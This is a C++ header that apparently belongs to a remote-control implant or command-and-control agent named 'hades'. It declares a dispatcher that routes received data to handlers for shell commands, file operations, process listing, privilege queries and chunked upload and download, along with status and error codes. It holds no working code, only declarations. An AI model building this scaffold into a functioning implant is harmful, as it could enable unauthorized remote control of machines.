#pragma once
#include "../hades/hades.h"


// todo fix these, right now calling g_ByteMgr->EndErr(*_SUCCESS), confusing when read, check do_rm() for example
// update g_ByteMgr->EndOK() to take a status, server checks if > 1, if so lookup in StatusCodeMap to get success string
#define CP_SUCCESS    488
#define CD_SUCCESS    489 
#define RM_SUCCESS	  490
#define RMDIR_SUCCESS 491 
#define MV_SUCCESS    492
#define MKDIR_SUCCESS 493
#define DOWNLOAD_SUCCESS 494

#define TASK_TYPE_GETPRIVS 3
#define TASK_TYPE_LS 4
#define TASK_PS_LIST 5
#define TASK_TYPE_UPLOAD 6
#define END_SIG 0xFFFFFFFF
#define STATUS_OK 0

#define TASK_TYPE_NO_PARSE 0

#define UPLOAD_CHUNKED 1
#define UPLOAD_NO_CHUNKED 2
#define UPLOAD_DONE 3

#define ERROR_OUT_OF_MEMORY 550
#define ERROR_TOKEN_SIZE 551
#define ERROR_FAILED_TOKENS 552
#define ERROR_LOOKUPPRIV_FAILED 553
#define ERROR_PS_LIST 554

#define COL_WIDTH 35

class commanders {
	enum CMD_ACTION_CODES {
		CMD_CODE_PS,
		CMD_CODE_CMD,
		CMD_CODE_CAT,
		CMD_CODE_LS,
		CMD_CODE_RM,
		CMD_CODE_MV,
		CMD_CODE_PWD,
		CMD_CODE_CD,
		CMD_CODE_CP,
		CMD_CODE_RMDIR,
		CMD_CODE_WHOAMI,
		CMD_CODE_MKDIR,
		CMD_CODE_UPLOAD,
		CMD_CODE_DOWNLOAD,
	};

	enum PrivStatus : UINT32 {
		PrivRemoved = 1,
		PrivEnabled = 2,
		PrivEnabledByDefault = 3,
		PrivDisabled = 4
	};

	enum UPLOAD_TYPES : UINT {
		UPLOAD_START_NON_CHUNKED = 0xc1,
		UPLOAD_START_CHUNKED = 0xc2,
		UPLOAD_CONTINUE = 0xc3,
		TS_UPLOAD_DONE = 0xc4
	};

	void do_mv();
	void do_whoami();
	void do_pwd();
	void do_cat();
	void do_rm();
	void do_ls();
	void do_cd();
	void do_cp();
	void do_rmdir();
	void do_mkdir();
	void do_ps();
	void do_upload();
	void do_download();


public:
	BOOL Dispatch(PBYTE Data, UINT size, PBYTE OutBuffer);
};

extern commanders* g_Commander;